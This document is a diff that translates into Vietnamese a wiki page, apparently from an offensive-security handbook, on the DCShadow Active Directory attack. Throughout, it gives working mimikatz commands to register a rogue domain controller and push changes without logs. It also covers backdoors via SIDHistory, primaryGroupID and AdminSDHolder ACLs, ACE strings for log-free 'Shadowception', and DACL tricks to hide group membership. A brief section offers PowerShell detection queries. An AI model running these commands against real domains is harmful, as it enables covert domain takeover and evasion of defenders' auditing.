@@ -5,10 +5,10 @@
 
 ## Basic Information
 
-It registers a **new Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without** leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\
-Note that if you use wrong data, pretty ugly logs will appear.<sup>[[2]](#references)</sup>
+Kỹ thuật này đăng ký một **Domain Controller** mới trong AD và dùng nó để **đẩy các thuộc tính** (SIDHistory, SPNs...) lên những đối tượng được chỉ định **mà không để lại bất kỳ log nào** về các **thay đổi**. Bạn **cần có đặc quyền DA** và phải ở bên trong **root domain**.\
+Lưu ý rằng nếu bạn dùng dữ liệu sai, các log khá tệ sẽ xuất hiện.<sup>[[2]](#references)</sup>
 
-To perform the attack you need 2 mimikatz instances. One of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform), and the other instance will be used to push the values:
+Để thực hiện cuộc tấn công, bạn cần 2 phiên bản mimikatz. Một phiên bản sẽ khởi chạy các RPC server với đặc quyền SYSTEM (tại đây, bạn phải chỉ định những thay đổi muốn thực hiện), còn phiên bản kia sẽ được dùng để đẩy các giá trị:
 
 ```bash:mimikatz1 (RPC servers)
 !+
@@ -20,26 +20,26 @@ lsadump::dcshadow /object:username /attribute:Description /value="My new descrip
 lsadump::dcshadow /push
 ```
 
-Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
-You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
+Lưu ý rằng **`elevate::token`** sẽ không hoạt động trong session `mimikatz1` vì lệnh này nâng quyền của thread, trong khi chúng ta cần nâng **quyền của process**.\
+Bạn cũng có thể chọn đối tượng "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`
 
-You can push the changes from a DA or from a user with this minimal permissions:
+Bạn có thể đẩy các thay đổi từ một DA hoặc từ người dùng có các quyền tối thiểu sau:
 
-- In the **domain object**:
-  - _DS-Install-Replica_ (Add/Remove Replica in Domain)
-  - _DS-Replication-Manage-Topology_ (Manage Replication Topology)
-  - _DS-Replication-Synchronize_ (Replication Synchornization)
-- The **Sites object** (and its children) in the **Configuration container**:
-  - _CreateChild and DeleteChild_
-- The object of the **computer which is registered as a DC**:
-  - _WriteProperty_ (Not Write)
-- The **target object**:
-  - _WriteProperty_ (Not Write)
+- Trên **đối tượng domain**:
+  - _DS-Install-Replica_ (Thêm/Xóa Replica trong Domain)
+  - _DS-Replication-Manage-Topology_ (Quản lý Replication Topology)
+  - _DS-Replication-Synchronize_ (Đồng bộ hóa Replication)
+- Trên đối tượng **Sites** (và các đối tượng con của nó) trong **Configuration container**:
+  - _CreateChild và DeleteChild_
+- Trên đối tượng máy tính được đăng ký làm DC:
+  - _WriteProperty_ (không phải Write)
+- Trên **đối tượng đích**:
+  - _WriteProperty_ (không phải Write)
 
-You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
-For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.
+Bạn có thể dùng [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) để cấp các quyền này cho người dùng không có đặc quyền (lưu ý rằng thao tác này sẽ để lại một số log). Cách này hạn chế hơn nhiều so với việc có quyền DA.\
+Ví dụ: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Điều này có nghĩa là username _**student1**_ khi đăng nhập trên máy _**mcorp-student1**_ có quyền DCShadow trên đối tượng _**root1user**_.
 
-## Using DCShadow to create backdoors
+## Sử dụng DCShadow để tạo backdoor
 
 ```bash:Set Enterprise Admins in SIDHistory to a user
 lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
@@ -56,17 +56,17 @@ lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
 lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
 ```
 
-### Primary group abuse, enumeration gaps, and detection
+### Lạm dụng primary group, thiếu sót trong liệt kê và phát hiện
 
-- `primaryGroupID` is a separate attribute from the group `member` list. DCShadow/DSInternals can write it directly (e.g., set `primaryGroupID=512` for **Domain Admins**) without on-box LSASS enforcement, but AD still **moves** the user: changing PGID always strips membership from the previous primary group (same behavior for any target group), so you cannot keep the old primary-group membership.<sup>[[1]](#references)</sup>
-- Default tools prevent removing a user from their current primary group (`ADUC`, `Remove-ADGroupMember`), so changing PGID typically requires direct directory writes (DCShadow/`Set-ADDBPrimaryGroup`).
-- Membership reporting is inconsistent:
-  - **Includes** primary-group-derived members: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
-  - **Omits** primary-group-derived members: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
-- Recursive checks can miss primary-group members if the **primary group is itself nested** (e.g., user PGID points to a nested group inside Domain Admins); `Get-ADGroupMember -Recursive` or LDAP recursive filters will not return that user unless recursion explicitly resolves primary groups.
-- DACL tricks: attackers can **deny ReadProperty** on `primaryGroupID` at the user (or on the group `member` attribute for non-AdminSDHolder groups), hiding effective membership from most PowerShell queries; `net group` will still resolve the membership. AdminSDHolder-protected groups will reset such denies.
+- `primaryGroupID` là thuộc tính riêng biệt với danh sách `member` của group. DCShadow/DSInternals có thể ghi trực tiếp thuộc tính này (ví dụ: đặt `primaryGroupID=512` cho **Domain Admins**) mà không chịu sự thực thi của LSASS trên máy, nhưng AD vẫn **di chuyển** user: thay đổi PGID luôn xóa membership khỏi primary group trước đó (hành vi tương tự với mọi group đích), vì vậy bạn không thể giữ membership trong primary group cũ.<sup>[[1]](#references)</sup>
+- Các công cụ mặc định không cho phép xóa user khỏi primary group hiện tại của họ (`ADUC`, `Remove-ADGroupMember`), nên việc thay đổi PGID thường cần ghi trực tiếp vào directory (DCShadow/`Set-ADDBPrimaryGroup`).
+- Việc báo cáo membership không nhất quán:
+  - **Bao gồm** các thành viên có được thông qua primary group: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
+  - **Bỏ qua** các thành viên có được thông qua primary group: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit khi kiểm tra `member`, `Get-ADUser <user> -Properties memberOf`.
+- Các kiểm tra đệ quy có thể bỏ sót thành viên primary group nếu **chính primary group được lồng trong một group khác** (ví dụ: PGID của user trỏ đến một group lồng bên trong Domain Admins); `Get-ADGroupMember -Recursive` hoặc các LDAP recursive filter sẽ không trả về user đó trừ khi quá trình đệ quy phân giải rõ ràng các primary group.
+- Thủ thuật DACL: attacker có thể **từ chối ReadProperty** trên `primaryGroupID` của user (hoặc trên thuộc tính `member` của group không thuộc AdminSDHolder), che giấu membership hiệu lực khỏi hầu hết truy vấn PowerShell; `net group` vẫn phân giải membership. Các group được AdminSDHolder bảo vệ sẽ khôi phục những thiết lập từ chối này.
 
-Detection/monitoring examples:
+Ví dụ về phát hiện/giám sát:
 
 ```powershell
 # Find users whose primary group is not the default Domain Users (RID 513)
@@ -82,29 +82,28 @@ Get-ADUser -Filter * -Properties primaryGroupID |
   Select-Object Name,SamAccountName
 ```
 
-Cross-check privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch discrepancies introduced by `primaryGroupID` or hidden attributes.<sup>[[1]](#references)</sup>
+Đối chiếu các nhóm đặc quyền bằng cách so sánh kết quả `Get-ADGroupMember` với `Get-ADGroup -Properties member` hoặc ADSI Edit để phát hiện sai lệch do `primaryGroupID` hoặc các thuộc tính ẩn gây ra.<sup>[[1]](#references)</sup>
 
-## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)
+## Shadowception - Cấp quyền DCShadow bằng DCShadow (không có log về quyền bị sửa đổi)
 
-We need to append following ACEs with our user's SID at the end:<sup>[[2]](#references)</sup>
+Chúng ta cần thêm các ACE sau với SID của người dùng ở cuối:<sup>[[2]](#references)</sup>
 
-- On the domain object:
+- Trên đối tượng domain:
   - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
   - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
   - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
-- On the attacker computer object: `(A;;WP;;;UserSID)`
-- On the target user object: `(A;;WP;;;UserSID)`
-- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`
+- Trên đối tượng máy tính của attacker: `(A;;WP;;;UserSID)`
+- Trên đối tượng người dùng mục tiêu: `(A;;WP;;;UserSID)`
+- Trên đối tượng Sites trong container Configuration: `(A;CI;CCDC;;;UserSID)`
 
-To get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
+Để lấy ACE hiện tại của một đối tượng: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
 
-In this case you need to make **several changes**, not just one. In the **mimikatz1 session** (RPC server), use the **`/stack` parameter with each change**. You then need to **`/push`** only once to apply all stacked changes from the rogue server.
+Trong trường hợp này, bạn cần thực hiện **nhiều thay đổi**, không chỉ một. Trong **phiên mimikatz1** (RPC server), hãy dùng tham số **`/stack` cho mỗi thay đổi**. Sau đó, bạn chỉ cần **`/push` một lần** để áp dụng tất cả thay đổi đã xếp chồng từ rogue server.
 
-[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>
+[**Tìm hiểu thêm về DCShadow trên ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>
 
 ## References
 
-- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
-- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
-
+- [1] [TrustedSec - Những khám phá về hành vi, báo cáo và khai thác Primary Group](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
+- [2] [Bài viết về DCShadow trên ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
 {{#include ../../banners/hacktricks-training.md}}
